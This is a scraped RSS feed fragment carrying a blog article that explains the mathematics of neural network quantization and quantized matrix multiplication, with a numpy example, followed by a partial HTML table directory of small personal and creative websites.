<![CDATA[Quantization for Neural Networks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25194218">thread link</a>) | @keyboardman
<br/>
November 23, 2020 | https://leimao.github.io/article/Neural-Networks-Quantization/ | <a href="https://web.archive.org/web/*/https://leimao.github.io/article/Neural-Networks-Quantization/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>Quantization refers to techniques for performing computations and storing tensors at lower bitwidths than floating point precision. A quantized model executes some or all of the operations on tensors with integers rather than floating point values. This allows for a more compact model representation and the use of high performance vectorized operations on many hardware platforms. This technique is in particular useful at the inference time since it saves a lot of inference computation cost without sacrificing too much inference accuracies.</p>



<p>So far, major deep learning frameworks, such as TensorFlow and PyTorch, have supported quantization natively. The users have been using the built-in quantization modules successfully without knowing how it works exactly. In this article, I would like to elucidate the mathematics of quantization for neural networks so that the developers would have some ideas about the quantization mechanisms.</p>

<h3 id="quantization">Quantization</h3>

<h4 id="quantization-mapping">Quantization Mapping</h4>

<p>Quantization maps a floating point value $x \in [\alpha, \beta]$ to a $b$-bit integer $x_q \in [\alpha_q, \beta_q]$.</p>



<p>Mathematically, the de-quantization process is defined as</p><p>

\[x = c (x_q + d)\]

</p><p>and the quantization process is defined as</p><p>

\[x_q = \text{round}\big(\frac{1}{c} x - d\big)\]

</p><p>where $c$ and $d$ are variables.</p>



<p>In order to derive $c$ and $d$, we have to make sure that $\alpha$ maps to $\alpha_q$ and $\beta$ maps to $\beta_q$. So we would just have to solve the linear system</p><p>

\[\begin{align}
\beta &amp;= c (\beta_q + d) \\
\alpha &amp;= c (\alpha_q + d) \\
\end{align}\]

</p><p>The solutions is</p><p>

\[\begin{align}
c &amp;= \frac{\beta - \alpha}{\beta_q - \alpha_q} \\
d &amp;= \frac{\alpha \beta_q - \beta \alpha_q}{\beta - \alpha} \\
\end{align}\]

</p><p>In practice, we would have to ensure that $0$ in floating point is represented exactly with no error after quantization.</p>



<p>Mathematically, we need to ensure</p><p>

\[\begin{align}
x_q &amp;= \text{round}\big(\frac{1}{c} 0 - d\big) \\
&amp;= \text{round}(- d) \\
&amp;= - \text{round}(d) \\
&amp;= - d \\
\end{align}\]

</p><p>This means that</p><p>

\[\begin{align}
d &amp;= \text{round}(d) \\
&amp;= \text{round}\big(\frac{\alpha \beta_q - \beta \alpha_q}{\beta - \alpha}\big) \\
\end{align}\]

</p><p>By convention, we denote $c$ as the scale $s$ and $-d$ as the zero point $z$.</p>



<p>To summarize, the de-quantization process is defined as</p><p>

\[x = s (x_q - z)\]

</p><p>and the quantization process is defined as</p><p>

\[x_q = \text{round}\big(\frac{1}{s} x + z\big)\]

</p><p>The value of scale $s$ and zero point $z$ are</p><p>

\[\begin{align}
s &amp;= \frac{\beta - \alpha}{\beta_q - \alpha_q} \\
z &amp;= \text{round}\big(\frac{\beta \alpha_q - \alpha \beta_q}{\beta - \alpha}\big) \\
\end{align}\]

</p><p>Note that $z$ is an integer and $s$ is a <em>positive</em> floating point number.</p>

<h4 id="value-clipping">Value Clipping</h4>

<p>In practice, the quantization process will have chance to have $x$ that is outside the range of $[\alpha, \beta]$, thus the quantized value $x_q$ will also be outside the range of $[\alpha_q, \beta_q]$. If the integer type is signed <code>INTb</code> and $(\alpha_q, \beta_q) = (-2^{b-1}, 2^{b-1}-1)$, or unsigned <code>UINTb</code> and $(\alpha_q, \beta_q) = (0, 2^{b}-1)$, programming languages that have fixed type-precisions will clip the values that are outside the range.</p>



<p>More concretely, the quantization process will have an additional clip step.</p><p>

\[x_q = \text{clip}\Big( \text{round}\big(\frac{1}{s} x + z\big), \alpha_q, \beta_q \Big)\]

</p><p>where $\text{clip}(x, l, u)$ function is defined as</p><p>

\[\begin{align}
\text{clip}(x, l, u) &amp;= 
    \begin{cases}
      l &amp; \text{if $x &lt; l$}\\
      x &amp; \text{if $l \leq x \leq u$}\\
      u &amp; \text{if $x &gt; u$}\\
    \end{cases} 
\end{align}\]

</p><h4 id="affine-quantization-mapping">Affine Quantization Mapping</h4>

<p>The quantization mapping we discussed above is also called affine quantization mapping.</p>

<h4 id="scale-quantization-mapping">Scale Quantization Mapping</h4>

<p>If the integer type is signed <code>INTb</code>, $(\alpha_q, \beta_q) = (-2^{b-1} + 1, 2^{b-1}-1)$ and we force $z = 0$.</p>



<p>Mathematically, we have</p><p>

\[\begin{gather}
\alpha_q = -\beta_q \\
\text{round}\big(\frac{\beta \alpha_q - \alpha \beta_q}{\beta - \alpha}\big) = 0 \\
\end{gather}\]

</p><p>This results in $\alpha = -\beta$. Therefore, we are mapping between the floating point range $[\alpha, -\alpha]$ and the integer range $[\alpha_q, -\alpha_q]$. Because it is exactly symmetric around $0$, we also call it symmetric quantization mapping.</p>



<p>Note that scale quantization mapping is just a special case of the affine quantization mapping, and we have an unused bit in the integer range.</p>

<h4 id="summary">Summary</h4>

<p>The quantization function is defined as</p><p>

\[f_q(x, s, z) = \text{clip}\Big( \text{round}\big(\frac{1}{s} x + z\big), \alpha_q, \beta_q \Big)\]

</p><p>and the de-quantization function is defined as</p><p>

\[f_d(x_q, s, z) = s (x_q - z)\]

</p><h3 id="quantized-matrix-multiplication">Quantized Matrix Multiplication</h3>

<h4 id="quantized-matrix-multiplication-mathematics">Quantized Matrix Multiplication Mathematics</h4>

<p>Suppose we have to perform the matrix multiplication $Y = XW + b$, where $X \in \mathbb{R}^{m \times p}$, $W \in \mathbb{R}^{p \times n}$, and $b \in \mathbb{R}^{n}$ resulting in $Y \in \mathbb{R}^{m \times n}$.</p><p>

\[\begin{align}
Y_{i, j} = b_j + \sum_{k=1}^{p} X_{i,k} W_{k,j}
\end{align}\]

</p><p>We would need to do $p$ floating number multiplications and $p$ floating number additions to compute one single entry in $Y$. To complete the full matrix multiplication, given there are $mn$ entries in $Y$, we would need to do $mpn$ floating number multiplications and $mpn$ floating number additions.</p>



<p>Depending on the floating number precision, such the speed of such floating point matrix multiplication might not be favored. So the question becomes can we complete the same matrix multiplication using quantized values.</p>



<p>Here we apply the de-quantization equation.</p><p>

\[\begin{align}
Y_{i, j} &amp;= b_j + \sum_{k=1}^{p} X_{i,k} W_{k,j} \\
&amp;= s_b (b_{q, j} - z_b) + \sum_{k=1}^{p} s_X(X_{q,i,k} - z_X) s_W(W_{q, k,j} - z_W)\\
&amp;= s_b (b_{q, j} - z_b) + s_X s_W \sum_{k=1}^{p} (X_{q,i,k} - z_X) (W_{q, k,j} - z_W)\\
&amp;= s_b (b_{q, j} - z_b) + s_X s_W \Bigg[ \bigg( \sum_{k=1}^{p} X_{q,i,k} W_{q, k,j} \bigg) - \bigg( z_W \sum_{k=1}^{p} X_{q,i,k} \bigg) - \bigg( z_X \sum_{k=1}^{p} W_{q, k,j} \bigg) + p z_X z_W\Bigg]\\
&amp;= s_Y(Y_{q,i,j} - z_Y)\\
\end{align}\]

</p><p>where $X_q$, $W_q$, $b_q$ and $Y_q$ are the quantized matrix for $X$, $W$, $b$ and $Y$, respectively, $s_X$, $s_W$, $s_b$, and $s_Y$ are the scales for $X$, $W$, $b$ and $Y$, respectively, and $z_X$, $z_W$, $z_b$ and $z_Y$ are the zero points for $X$, $W$, $b$ and $Y$, respectively.</p>



<p>Therefore,</p><p>

\[Y_{q,i,j} = z_Y + \frac{s_b}{s_Y} (b_{q, j} - z_b) + \frac{s_X s_W}{s_Y} \Bigg[ \bigg( \sum_{k=1}^{p} X_{q,i,k} W_{q, k,j} \bigg) - \bigg( z_W \sum_{k=1}^{p} X_{q,i,k} \bigg) - \bigg( z_X \sum_{k=1}^{p} W_{q, k,j} \bigg) + p z_X z_W\Bigg]\]

</p><p>Note that in the above equation the following terms are constants during inference and therefore could be computed offline before inference.</p>

<ul>
  <li>$z_Y$</li>
  <li>$\frac{s_b}{s_Y} (b_{q, j} - z_b)$</li>
  <li>$z_X \sum_{k=1}^{p} W_{q, k,j}$</li>
  <li>$p z_X z_W$</li>
</ul>

<p>Term $\sum_{k=1}^{p} X_{q,i,k} W_{q, k,j}$ suggests that we could just do the integer matrix multiplication for $X_q$ and $W_q$. Such integer matrix multiplication could employ special hardware and algorithms, such as <a href="https://www.nvidia.com/en-us/data-center/tensor-cores/">NVIDIA Tensor Core</a> and <a href="https://docs.nvidia.com/cuda/ampere-tuning-guide/index.html#tensor-operations">Tensor Core IMMA operations</a>, and runs much faster than conventional integer matrix multiplication.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/article/2020-11-01-Neural-Networks-Quantization/tensor-core.png">
    <figcaption>NVIDIA Tensor Core Operations</figcaption>
</figure>
</div>

<p>One additional thing to note is that $s_X$, $s_W$, $s_Y$, $z_X$, $z_W$, and $z_Y$ are floating point and integer constants, instead of variables. So there could be some special compile-time optimizations for those multiplications.</p>



<p>This could be retrieved from the resulting integer matrix from $X_q$ and $W_q$ multiplication, which is much faster than the floating number matrix multiplication for the same sizes.</p>



<p>The significance of such quantized matrix multiplication is that the product integer matrix could be converted back to floating point matrix using the scale and the zero point of the product integer matrix and it is almost numerically equivalent. If we have to do a sequence of matrix multiplications whose inputs and outputs are floating point numbers, for example</p><p>

\[\begin{align}
X_1 &amp;= X_0 W_0 + b_0\\
X_2 &amp;= X_1 W_1 + b_1\\
&amp;\vdots \\
X_n &amp;= X_n W_n + b_n\\
\end{align}\]

</p><p>We could convert the math to the followings using quantized matrices.</p><p>

\[\begin{align}
X_{0, q} &amp;= f_q(X_0, s_{X_0}, z_{X_0})\\
X_{1, q} &amp;= f_m(X_{0, q}, W_{0, q}, b_{0, q}, s_{X_0}, z_{X_0}, s_{W_0}, z_{W_0}, s_{b_0}, z_{b_0}, s_{X_1}, z_{X_1}) \\
X_{2, q} &amp;= f_m(X_{1, q}, W_{1, q}, b_{1, q}, s_{X_1}, z_{X_1}, s_{W_1}, z_{W_1}, s_{b_1}, z_{b_1}, s_{X_2}, z_{X_2}) \\
&amp;\vdots \\
X_{n, q} &amp;= f_m(X_{n-1, q}, W_{n-1, q}, b_{n-1, q}, s_{X_{n-1}}, z_{X_{n-1}}, s_{W_{n-1}}, z_{W_{n-1}}, s_{b_{n-1}}, z_{b_{n-1}}, s_{X_n}, z_{X_n}) \\
X_n &amp;= f_d(X_{n, q}, s_{X_n}, z_{X_n})
\end{align}\]

</p><p>where $f_q$ is the quantization function, $f_m$ is the quantized matrix multiplication function, and $f_d$ is the de-quantization function.</p>

<h4 id="examples">Examples</h4>

<p>In the following example, we simulated the quantization matrix multiplication of $Y = XW + b$ using random matrix $X$, $W$ and $b$.</p>

<div><div><pre><code><span># gemm.py
</span><span>import</span> <span>numpy</span> <span>as</span> <span>np</span>

<span>def</span> <span>quantization</span><span>(</span><span>x</span><span>,</span> <span>s</span><span>,</span> <span>z</span><span>,</span> <span>alpha_q</span><span>,</span> <span>beta_q</span><span>):</span>

    <span>x_q</span> <span>=</span> <span>np</span><span>.</span><span>round</span><span>(</span><span>1</span> <span>/</span> <span>s</span> <span>*</span> <span>x</span> <span>+</span> <span>z</span><span>,</span> <span>decimals</span><span>=</span><span>0</span><span>)</span>
    <span>x_q</span> <span>=</span> <span>np</span><span>.</span><span>clip</span><span>(</span><span>x_q</span><span>,</span> <span>a_min</span><span>=</span><span>alpha_q</span><span>,</span> <span>a_max</span><span>=</span><span>beta_q</span><span>)</span>

    <span>return</span> <span>x_q</span>

<span>def</span> <span>quantization_int8</span><span>(</span><span>x</span><span>,</span> <span>s</span><span>,</span> <span>z</span><span>):</span>

    <span>x_q</span> <span>=</span> <span>quantization</span><span>(</span><span>x</span><span>,</span> <span>s</span><span>,</span> <span>z</span><span>,</span> <span>alpha_q</span><span>=-</span><span>128</span><span>,</span> <span>beta_q</span><span>=</span><span>127</span><span>)</span>
    <span>x_q</span> <span>=</span> <span>x_q</span><span>.</span><span>astype</span><span>(</span><span>np</span><span>.</span><span>int8</span><span>)</span>

    <span>return</span> <span>x_q</span>

<span>def</span> <span>dequantization</span><span>(</span><span>x_q</span><span>,</span> <span>s</span><span>,</span> <span>z</span><span>):</span>

    <span>x</span> <span>=</span> <span>s</span> <span>*</span> <span>(</span><span>x_q</span> <span>-</span> <span>z</span><span>)</span>
    <span>x</span> <span>=</span> <span>x</span><span>.</span><span>astype</span><span>(</span><span>np</span><span>.</span><span>float32</span><span>)</span>

    <span>return</span> <span>x</span>

<span>def</span> <span>generate_quantization_constants</span><span>(</span><span>alpha</span><span>,</span> <span>beta</span><span>,</span> <span>alpha_q</span><span>,</span> <span>beta_q</span><span>):</span>

    <span># Affine quantization mapping
</span>    <span>s</span> <span>=</span> <span>(</span><span>beta</span> <span>-</span> <span>alpha</span><span>)</span> <span>/</span> <span>(</span><span>beta_q</span> <span>-</span> <span>alpha_q</span><span>)</span>
    <span>z</span> <span>=</span> <span>int</span><span>((</span><span>beta</span> <span>*</span> <span>alpha_q</span> <span>-</span> <span>alpha</span> <span>*</span> <span>beta_q</span><span>)</span> <span>/</span> <span>(</span><span>beta</span> <span>-</span> <span>alpha</span><span>))</span>

    <span>return</span> <span>s</span><span>,</span> <span>z</span>

<span>def</span> <span>generate_quantization_int8_constants</span><span>(</span><span>alpha</span><span>,</span> <span>beta</span><span>):</span>

    <span>b</span> <span>=</span> <span>8</span>
    <span>alpha_q</span> <span>=</span> <span>-</span><span>2</span> <span>**</span> <span>(</span><span>b</span><span>-</span><span>1</span><span>)</span>
    <span>beta_q</span> <span>=</span> <span>2</span> <span>**</span> <span>(</span><span>b</span><span>-</span><span>1</span><span>)</span> <span>-</span> <span>1</span>

    <span>s</span><span>,</span> <span>z</span> <span>=</span> <span>generate_quantization_constants</span><span>(</span><span>alpha</span><span>=</span><span>alpha</span><span>,</span> <span>beta</span><span>=</span><span>beta</span><span>,</span> <span>alpha_q</span><span>=</span><span>alpha_q</span><span>,</span> <span>beta_q</span><span>=</span><span>beta_q</span><span>)</span>

    <span>return</span> <span>s</span><span>,</span> <span>z</span>

<span>def</span> <span>quantization_matrix_multiplication_int8</span><span>(</span><span>X_q</span><span>,</span> <span>W_q</span><span>,</span> <span>b_q</span><span>,</span> <span>s_X</span><span>,</span> <span>z_…</span></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://leimao.github.io/article/Neural-Networks-Quantization/">https://leimao.github.io/article/Neural-Networks-Quantization/</a></em></p>]]>
            </description>
            <link>https://leimao.github.io/article/Neural-Networks-Quantization/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25194218</guid>
            <pubDate>Tue, 24 Nov 2020 01:30:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Low Tech Directory]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25194202">thread link</a>) | @iuguy
<br/>
November 23, 2020 | https://emreed.net/LowTech_Directory.html | <a href="https://web.archive.org/web/*/https://emreed.net/LowTech_Directory.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<tr>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;#&quot;}">#</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;URL&quot;}">URL</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Owner&quot;}">Owner</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Description&quot;}">Description</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:1}">1</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://coleoptera.neocities.org/&quot;}" data-sheets-hyperlink="https://coleoptera.neocities.org/"><a href="https://coleoptera.neocities.org/" target="_blank">https://coleoptera.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Em (me!)&quot;}">Em (me!)</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Writing and curation portfolio about small games, alt games and art games&quot;}">Writing and curation portfolio about small games, alt games and art games</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:2}">2</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://candle.neocities.org/&quot;}" data-sheets-hyperlink="https://candle.neocities.org/"><a href="https://candle.neocities.org/" target="_blank">https://candle.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;candle&quot;}">candle</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Blog and small games projects&quot;}">Blog and small games projects</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:3}">3</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://spdrcstl.com/&quot;}" data-sheets-hyperlink="https://spdrcstl.com/"><a href="https://spdrcstl.com/" target="_blank">https://spdrcstl.com/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Freya Campbell&quot;}">Freya Campbell</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Sci-fi, games, writing and music&quot;}">Sci-fi, games, writing and music</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:4}">4</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://nialltl.neocities.org/&quot;}" data-sheets-hyperlink="https://nialltl.neocities.org/"><a href="https://nialltl.neocities.org/" target="_blank">https://nialltl.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;nialltl&quot;}">nialltl</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Games and other dev projects&quot;}">Games and other dev projects</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:5}">5</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://emmadaues.neocities.org/&quot;}" data-sheets-hyperlink="https://emmadaues.neocities.org/"><a href="https://emmadaues.neocities.org/" target="_blank">https://emmadaues.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Emma Daues&quot;}">Emma Daues</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Games, art and music portfolio&quot;}">Games, art and music portfolio</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:6}">6</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://pooka.press/&quot;}" data-sheets-hyperlink="http://pooka.press/"><a href="http://pooka.press/" target="_blank">http://pooka.press/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Pooka Press&quot;}">Pooka Press</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Fiction and comics&quot;}">Fiction and comics</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:7}">7</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://forums.transbian.love/&quot;}" data-sheets-hyperlink="http://forums.transbian.love/"><a href="http://forums.transbian.love/" target="_blank">http://forums.transbian.love/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Lesbiaboard&quot;}">Lesbiaboard</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;A forum for trans lesbians, likeminded LGBT+ people, and allies&quot;}">A forum for trans lesbians, likeminded LGBT+ people, and allies</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:8}">8</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://onionboi.neocities.org/&quot;}" data-sheets-hyperlink="https://onionboi.neocities.org/"><a href="https://onionboi.neocities.org/" target="_blank">https://onionboi.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;onion&quot;}">onion</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Home of all things onion&quot;}">Home of all things onion</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:9}">9</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://thufie.lain.haus/&quot;}" data-sheets-hyperlink="https://thufie.lain.haus/"><a href="https://thufie.lain.haus/" target="_blank">https://thufie.lain.haus/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;thufie&quot;}">thufie</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Blog plus free software and cyberpunk info&quot;}">Blog plus free software and cyberpunk info</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:10}">10</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://rumpel.neocities.org/&quot;}" data-sheets-hyperlink="https://rumpel.neocities.org/"><a href="https://rumpel.neocities.org/" target="_blank">https://rumpel.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Rumpelcita&quot;}">Rumpelcita</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Indie games and mods&quot;}">Indie games and mods</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:11}">11</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://caeth.net/&quot;}" data-sheets-hyperlink="https://caeth.net/"><a href="https://caeth.net/" target="_blank">https://caeth.net/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;caeth&quot;}">caeth</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;a variety of creative projects by caeth&quot;}">a variety of creative projects by caeth</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:12}">12</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://lnnyfrnds.neocities.org/&quot;}" data-sheets-hyperlink="https://lnnyfrnds.neocities.org/"><a href="https://lnnyfrnds.neocities.org/" target="_blank">https://lnnyfrnds.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Lenny Magner&quot;}">Lenny Magner</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Music and cute bitsy games by Lenny&quot;}">Music and cute bitsy games by Lenny</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:13}">13</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://www.vertexmeadow.xyz/&quot;}" data-sheets-hyperlink="http://www.vertexmeadow.xyz/"><a href="http://www.vertexmeadow.xyz/" target="_blank">http://www.vertexmeadow.xyz/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Ian MacLarty&quot;}">Ian MacLarty</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;A tool for generating 3D worlds from 2D images&quot;}">A tool for generating 3D worlds from 2D images</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:14}">14</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://suricrasia.online/&quot;}" data-sheets-hyperlink="https://suricrasia.online/"><a href="https://suricrasia.online/" target="_blank">https://suricrasia.online/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Suricrasia Online&quot;}">Suricrasia Online</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Demoscene, imaginary books and more&quot;}">Demoscene, imaginary books and more</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:15}">15</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://maple.pet/&quot;}" data-sheets-hyperlink="http://maple.pet/"><a href="http://maple.pet/" target="_blank">http://maple.pet/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;maple's website&quot;}">maple's website</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Music, art and coding projects&quot;}">Music, art and coding projects</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:16}">16</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://www.femicom.org/sozai/&quot;}" data-sheets-hyperlink="http://www.femicom.org/sozai/"><a href="http://www.femicom.org/sozai/" target="_blank">http://www.femicom.org/sozai/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;FEMICOM Sozai Collection&quot;}">FEMICOM Sozai Collection</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;An online archive presenting the history of pixel gifts&quot;}">An online archive presenting the history of pixel gifts</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:17}">17</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://niceware.neocities.org/&quot;}" data-sheets-hyperlink="https://niceware.neocities.org/"><a href="https://niceware.neocities.org/" target="_blank">https://niceware.neocities.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;basile&quot;}">basile</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;a site presenting baz's bitsy games&quot;}">a site presenting baz's bitsy games</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:18}">18</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://irradiate.space/&quot;}" data-sheets-hyperlink="https://irradiate.space/"><a href="https://irradiate.space/" target="_blank">https://irradiate.space/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Irradiate Space&quot;}">Irradiate Space</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;A collection of fiction and comics&quot;}">A collection of fiction and comics</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:19}">19</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://oliverblueberry.info/&quot;}" data-sheets-hyperlink="http://oliverblueberry.info/"><a href="http://oliverblueberry.info/" target="_blank">http://oliverblueberry.info/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Daniel P. Lopez&quot;}">Daniel P. Lopez</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Links to small games, comics and zines&quot;}">Links to small games, comics and zines</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:20}">20</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://harmonyzone.org/&quot;}" data-sheets-hyperlink="http://harmonyzone.org/"><a href="http://harmonyzone.org/" target="_blank">http://harmonyzone.org/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;thecatamites&quot;}">thecatamites</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;\&quot;dumb shit... no wait put \&quot;dumb shit (comma) games writing\&quot;\&quot;&quot;}">"dumb shit... no wait put "dumb shit (comma) games writing""</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:21}">21</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://tn5421.github.io&quot;}" data-sheets-hyperlink="https://tn5421.github.io"><a href="https://tn5421.github.io/" target="_blank">https://tn5421.github.io</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;TN's Homepage&quot;}">TN's Homepage</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;A collection of game tools and writing&quot;}">A collection of game tools and writing</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:22}">22</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://ekardnam.github.io/&quot;}" data-sheets-hyperlink="https://ekardnam.github.io/"><a href="https://ekardnam.github.io/" target="_blank">https://ekardnam.github.io/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;ekardnam&quot;}">ekardnam</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;blog on libertarian technology and infosec&quot;}">blog on libertarian technology and infosec</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:23}">23</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;http://thewindspirit.com/&quot;}" data-sheets-hyperlink="http://thewindspirit.com/"><a href="http://thewindspirit.com/" target="_blank">http://thewindspirit.com/</a></td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Max Anderson&quot;}">Max Anderson</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Animations and blog&quot;}">Animations and blog</td>
</tr>
<tr>
<td data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:24}">24</td>
<td data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;https://obshagce.gamemaking.tools/&quot;}" data-sheets-hyperlink="https://obshagce.gamemaking.tools/"><a href="https://obshagce.gamemaking.tools/" target="_blank">https://obshagce.gamemaking.tools/</a></td>
